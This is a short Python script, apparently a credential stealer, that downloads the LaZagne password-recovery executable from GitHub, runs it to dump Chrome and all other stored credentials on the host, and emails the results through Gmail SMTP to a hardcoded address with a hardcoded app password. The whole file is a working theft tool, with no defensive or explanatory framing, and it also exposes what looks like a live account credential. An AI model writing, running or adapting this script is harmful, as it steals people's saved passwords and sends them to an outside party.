import requests
import subprocess
import smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    filename = url.split("/")[-1]
    get = requests.get(url)
    
    with open(filename, "wb") as outfile:
        outfile.write(get.content)  
        print(filename)

url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
download(url)

data1=subprocess.check_output("LaZagne.exe browser -chrome  ",shell="True")
print("data1-suss")
data2=subprocess.check_output("LaZagne.exe all ",shell="True")

send_mail("sanjay22522g@gmail.com","zehs fuqr xpfv onwz",data1)


send_mail("sanjay22522g@gmail.com","zehs fuqr xpfv onwz",data2)

print("done")


